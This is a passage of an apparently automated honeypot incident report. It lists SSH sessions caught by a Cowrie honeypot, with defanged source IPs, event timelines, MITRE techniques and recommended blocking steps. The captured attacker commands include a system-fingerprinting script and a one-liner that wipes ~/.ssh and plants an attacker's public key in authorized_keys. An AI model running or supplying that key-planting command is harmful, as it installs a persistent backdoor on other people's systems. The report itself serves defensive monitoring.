| `2026-07-21 03:30:34` | `cowrie.command.input` |
| `2026-07-21 03:30:34` | `cowrie.command.input` |
| `2026-07-21 03:30:35` | `cowrie.log.closed` |
| `2026-07-21 03:30:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9d349ecda81

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 03:32 |
| **Last Seen** | 2026-07-21 03:32 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:32:38` | `cowrie.session.connect` |
| `2026-07-21 03:32:38` | `cowrie.client.version` |
| `2026-07-21 03:32:38` | `cowrie.client.kex` |
| `2026-07-21 03:32:40` | `cowrie.login.success` |
| `2026-07-21 03:32:42` | `cowrie.session.params` |
| `2026-07-21 03:32:42` | `cowrie.command.input` |
| `2026-07-21 03:32:42` | `cowrie.command.input` |
| `2026-07-21 03:32:42` | `cowrie.command.input` |
| `2026-07-21 03:32:42` | `cowrie.command.input` |
| `2026-07-21 03:32:42` | `cowrie.command.input` |
| `2026-07-21 03:32:42` | `cowrie.command.success` |
| `2026-07-21 03:32:42` | `cowrie.command.input` |
| `2026-07-21 03:32:42` | `cowrie.command.input` |
| `2026-07-21 03:32:42` | `cowrie.command.input` |
| `2026-07-21 03:32:42` | `cowrie.command.input` |
| `2026-07-21 03:32:42` | `cowrie.log.closed` |
| `2026-07-21 03:32:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcaf1722f87e

| Field | Detail |
|---|---|
| **Source IP** | `189.56.0[.]19` |
| **First Seen** | 2026-07-21 03:32 |
| **Last Seen** | 2026-07-21 03:33 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:32:49` | `cowrie.session.connect` |
| `2026-07-21 03:32:51` | `cowrie.client.version` |
| `2026-07-21 03:32:51` | `cowrie.client.kex` |
| `2026-07-21 03:32:53` | `cowrie.login.success` |
| `2026-07-21 03:32:54` | `cowrie.direct-tcpip.request` |
| `2026-07-21 03:33:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.56.0[.]19` to AbuseIPDB if not already reported
- [ ] Block `189.56.0[.]19` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dac16d596a22

| Field | Detail |
|---|---|
| **Source IP** | `117.252.93[.]114` |
| **First Seen** | 2026-07-21 03:32 |
| **Last Seen** | 2026-07-21 03:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:32:59` | `cowrie.session.connect` |
| `2026-07-21 03:33:00` | `cowrie.client.version` |
| `2026-07-21 03:33:00` | `cowrie.client.kex` |
| `2026-07-21 03:33:02` | `cowrie.login.success` |
| `2026-07-21 03:33:02` | `cowrie.direct-tcpip.request` |
| `2026-07-21 03:33:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.252.93[.]114` to AbuseIPDB if not already reported
- [ ] Block `117.252.93[.]114` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aff8e0095099

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 03:34 |
| **Last Seen** | 2026-07-21 03:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:34:48` | `cowrie.session.connect` |
| `2026-07-21 03:34:49` | `cowrie.client.version` |
| `2026-07-21 03:34:49` | `cowrie.client.kex` |
| `2026-07-21 03:34:50` | `cowrie.login.success` |
| `2026-07-21 03:34:52` | `cowrie.session.params` |
| `2026-07-21 03:34:52` | `cowrie.command.input` |
| `2026-07-21 03:34:52` | `cowrie.command.input` |
| `2026-07-21 03:34:52` | `cowrie.command.input` |
| `2026-07-21 03:34:52` | `cowrie.command.input` |
| `2026-07-21 03:34:52` | `cowrie.command.input` |
| `2026-07-21 03:34:52` | `cowrie.command.success` |
| `2026-07-21 03:34:52` | `cowrie.command.input` |
| `2026-07-21 03:34:52` | `cowrie.command.input` |
| `2026-07-21 03:34:52` | `cowrie.command.input` |
| `2026-07-21 03:34:52` | `cowrie.command.input` |
| `2026-07-21 03:34:53` | `cowrie.log.closed` |
| `2026-07-21 03:34:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1312ebe44c2

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-21 03:34 |
| **Last Seen** | 2026-07-21 03:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:34:58` | `cowrie.session.connect` |
| `2026-07-21 03:34:59` | `cowrie.client.version` |
| `2026-07-21 03:34:59` | `cowrie.client.kex` |
| `2026-07-21 03:34:59` | `cowrie.login.success` |
| `2026-07-21 03:34:59` | `cowrie.direct-tcpip.request` |
| `2026-07-21 03:34:59` | `cowrie.direct-tcpip.ja4` |
| `2026-07-21 03:34:59` | `cowrie.direct-tcpip.data` |
| `2026-07-21 03:34:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0805840ef51c

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-21 03:35 |
| **Last Seen** | 2026-07-21 03:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:35:58` | `cowrie.session.connect` |
| `2026-07-21 03:35:58` | `cowrie.client.version` |
| `2026-07-21 03:35:58` | `cowrie.client.kex` |
| `2026-07-21 03:35:59` | `cowrie.login.success` |
| `2026-07-21 03:35:59` | `cowrie.session.params` |
| `2026-07-21 03:35:59` | `cowrie.command.input` |
| `2026-07-21 03:35:59` | `cowrie.log.closed` |
| `2026-07-21 03:35:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-405f8ef555af

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-21 03:36 |
| **Last Seen** | 2026-07-21 03:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:36:06` | `cowrie.session.connect` |
| `2026-07-21 03:36:06` | `cowrie.client.version` |
| `2026-07-21 03:36:06` | `cowrie.client.kex` |
| `2026-07-21 03:36:07` | `cowrie.login.success` |
| `2026-07-21 03:36:07` | `cowrie.direct-tcpip.request` |
| `2026-07-21 03:36:07` | `cowrie.direct-tcpip.ja4` |
| `2026-07-21 03:36:07` | `cowrie.direct-tcpip.data` |
| `2026-07-21 03:36:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c0225398426

| Field | Detail |
|---|---|
| **Source IP** | `49.124.150[.]247` |
| **First Seen** | 2026-07-21 03:36 |
| **Last Seen** | 2026-07-21 03:36 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:36:18` | `cowrie.session.connect` |
| `2026-07-21 03:36:19` | `cowrie.client.version` |
| `2026-07-21 03:36:19` | `cowrie.client.kex` |
| `2026-07-21 03:36:21` | `cowrie.login.success` |
| `2026-07-21 03:36:21` | `cowrie.direct-tcpip.request` |
| `2026-07-21 03:36:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.150[.]247` to AbuseIPDB if not already reported
- [ ] Block `49.124.150[.]247` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-774fe6afd1cd

| Field | Detail |
|---|---|
| **Source IP** | `196.188.187[.]85` |
| **First Seen** | 2026-07-21 03:36 |
| **Last Seen** | 2026-07-21 03:36 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:36:32` | `cowrie.session.connect` |
| `2026-07-21 03:36:32` | `cowrie.client.version` |
| `2026-07-21 03:36:32` | `cowrie.client.kex` |
| `2026-07-21 03:36:33` | `cowrie.login.success` |
| `2026-07-21 03:36:34` | `cowrie.direct-tcpip.request` |
| `2026-07-21 03:36:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.187[.]85` to AbuseIPDB if not already reported
- [ ] Block `196.188.187[.]85` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27e9d2383d74

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 03:37 |
| **Last Seen** | 2026-07-21 03:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:37:00` | `cowrie.session.connect` |
| `2026-07-21 03:37:01` | `cowrie.client.version` |
| `2026-07-21 03:37:01` | `cowrie.client.kex` |
| `2026-07-21 03:37:03` | `cowrie.login.success` |
| `2026-07-21 03:37:04` | `cowrie.session.params` |
| `2026-07-21 03:37:04` | `cowrie.command.input` |
| `2026-07-21 03:37:04` | `cowrie.command.input` |
| `2026-07-21 03:37:04` | `cowrie.command.input` |
| `2026-07-21 03:37:04` | `cowrie.command.input` |
| `2026-07-21 03:37:04` | `cowrie.command.input` |
| `2026-07-21 03:37:04` | `cowrie.command.success` |
| `2026-07-21 03:37:04` | `cowrie.command.input` |
| `2026-07-21 03:37:04` | `cowrie.command.input` |
| `2026-07-21 03:37:04` | `cowrie.command.input` |
| `2026-07-21 03:37:04` | `cowrie.command.input` |
| `2026-07-21 03:37:05` | `cowrie.log.closed` |
| `2026-07-21 03:37:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8221d1eabf09

| Field | Detail |
|---|---|
| **Source IP** | `182.13.96[.]129` |
| **First Seen** | 2026-07-21 03:37 |
| **Last Seen** | 2026-07-21 03:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:37:57` | `cowrie.session.connect` |
| `2026-07-21 03:37:57` | `cowrie.client.version` |
| `2026-07-21 03:37:57` | `cowrie.client.kex` |
| `2026-07-21 03:37:58` | `cowrie.login.success` |
| `2026-07-21 03:37:59` | `cowrie.session.params` |
| `2026-07-21 03:37:59` | `cowrie.command.input` |
| `2026-07-21 03:37:59` | `cowrie.command.failed` |
| `2026-07-21 03:38:00` | `cowrie.log.closed` |
| `2026-07-21 03:38:00` | `cowrie.session.params` |
| `2026-07-21 03:38:00` | `cowrie.command.input` |
| `2026-07-21 03:38:01` | `cowrie.session.file_download` |
| `2026-07-21 03:38:01` | `cowrie.log.closed` |
| `2026-07-21 03:38:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.13.96[.]129` to AbuseIPDB if not already reported
- [ ] Block `182.13.96[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0828d4617175

| Field | Detail |
|---|---|
| **Source IP** | `182.13.96[.]129` |
| **First Seen** | 2026-07-21 03:38 |
| **Last Seen** | 2026-07-21 03:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:38:01` | `cowrie.session.connect` |
| `2026-07-21 03:38:01` | `cowrie.client.version` |
| `2026-07-21 03:38:01` | `cowrie.client.kex` |
| `2026-07-21 03:38:02` | `cowrie.login.success` |
| `2026-07-21 03:38:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.13.96[.]129` to AbuseIPDB if not already reported
- [ ] Block `182.13.96[.]129` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7e1d94ace45

| Field | Detail |
|---|---|
| **Source IP** | `182.13.96[.]129` |
| **First Seen** | 2026-07-21 03:38 |
| **Last Seen** | 2026-07-21 03:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:38:03` | `cowrie.session.connect` |
| `2026-07-21 03:38:03` | `cowrie.client.version` |
| `2026-07-21 03:38:03` | `cowrie.client.kex` |
| `2026-07-21 03:38:04` | `cowrie.login.success` |
| `2026-07-21 03:38:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.13.96[.]129` to AbuseIPDB if not already reported
- [ ] Block `182.13.96[.]129` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4eee5ee2a22

| Field | Detail |
|---|---|
| **Source IP** | `103.190.7[.]203` |
| **First Seen** | 2026-07-21 03:38 |
| **Last Seen** | 2026-07-21 03:38 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:38:36` | `cowrie.session.connect` |
| `2026-07-21 03:38:36` | `cowrie.client.version` |
| `2026-07-21 03:38:36` | `cowrie.client.kex` |
| `2026-07-21 03:38:37` | `cowrie.login.success` |
| `2026-07-21 03:38:38` | `cowrie.session.params` |
| `2026-07-21 03:38:38` | `cowrie.command.input` |
| `2026-07-21 03:38:38` | `cowrie.command.failed` |
| `2026-07-21 03:38:38` | `cowrie.log.closed` |
| `2026-07-21 03:38:39` | `cowrie.session.params` |
| `2026-07-21 03:38:39` | `cowrie.command.input` |
| `2026-07-21 03:38:39` | `cowrie.session.file_download` |
| `2026-07-21 03:38:39` | `cowrie.log.closed` |
| `2026-07-21 03:38:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.190.7[.]203` to AbuseIPDB if not already reported
- [ ] Block `103.190.7[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ab3f1a98409

| Field | Detail |
|---|---|
| **Source IP** | `103.190.7[.]203` |
| **First Seen** | 2026-07-21 03:38 |
| **Last Seen** | 2026-07-21 03:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:38:40` | `cowrie.session.connect` |
| `2026-07-21 03:38:40` | `cowrie.client.version` |
| `2026-07-21 03:38:40` | `cowrie.client.kex` |
| `2026-07-21 03:38:41` | `cowrie.login.success` |
| `2026-07-21 03:38:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.190.7[.]203` to AbuseIPDB if not already reported
- [ ] Block `103.190.7[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0602753ed4da

| Field | Detail |
|---|---|
| **Source IP** | `103.190.7[.]203` |
| **First Seen** | 2026-07-21 03:38 |
| **Last Seen** | 2026-07-21 03:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:38:41` | `cowrie.session.connect` |
| `2026-07-21 03:38:41` | `cowrie.client.version` |
| `2026-07-21 03:38:41` | `cowrie.client.kex` |
| `2026-07-21 03:38:42` | `cowrie.login.success` |
| `2026-07-21 03:38:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.190.7[.]203` to AbuseIPDB if not already reported
- [ ] Block `103.190.7[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89ac41fe449c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 03:39 |
| **Last Seen** | 2026-07-21 03:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:39:12` | `cowrie.session.connect` |
| `2026-07-21 03:39:12` | `cowrie.client.version` |
| `2026-07-21 03:39:12` | `cowrie.client.kex` |
| `2026-07-21 03:39:14` | `cowrie.login.success` |
| `2026-07-21 03:39:15` | `cowrie.session.params` |
| `2026-07-21 03:39:15` | `cowrie.command.input` |
| `2026-07-21 03:39:15` | `cowrie.command.input` |
| `2026-07-21 03:39:15` | `cowrie.command.input` |
| `2026-07-21 03:39:15` | `cowrie.command.input` |
| `2026-07-21 03:39:15` | `cowrie.command.input` |
| `2026-07-21 03:39:15` | `cowrie.command.success` |
| `2026-07-21 03:39:15` | `cowrie.command.input` |
| `2026-07-21 03:39:15` | `cowrie.command.input` |
| `2026-07-21 03:39:15` | `cowrie.command.input` |
| `2026-07-21 03:39:15` | `cowrie.command.input` |
| `2026-07-21 03:39:16` | `cowrie.log.closed` |
| `2026-07-21 03:39:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc7f2bedc24d

| Field | Detail |
|---|---|
| **Source IP** | `103.83.23[.]169` |
| **First Seen** | 2026-07-21 03:39 |
| **Last Seen** | 2026-07-21 03:39 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:39:23` | `cowrie.session.connect` |
| `2026-07-21 03:39:23` | `cowrie.client.version` |
| `2026-07-21 03:39:23` | `cowrie.client.kex` |
| `2026-07-21 03:39:24` | `cowrie.login.success` |
| `2026-07-21 03:39:25` | `cowrie.direct-tcpip.request` |
| `2026-07-21 03:39:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.83.23[.]169` to AbuseIPDB if not already reported
- [ ] Block `103.83.23[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5bb2346e6ae

| Field | Detail |
|---|---|
| **Source IP** | `65.20.163[.]103` |
| **First Seen** | 2026-07-21 03:39 |
| **Last Seen** | 2026-07-21 03:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:39:30` | `cowrie.session.connect` |
| `2026-07-21 03:39:31` | `cowrie.client.version` |
| `2026-07-21 03:39:31` | `cowrie.client.kex` |
| `2026-07-21 03:39:32` | `cowrie.login.success` |
| `2026-07-21 03:39:32` | `cowrie.direct-tcpip.request` |
| `2026-07-21 03:39:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.163[.]103` to AbuseIPDB if not already reported
- [ ] Block `65.20.163[.]103` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
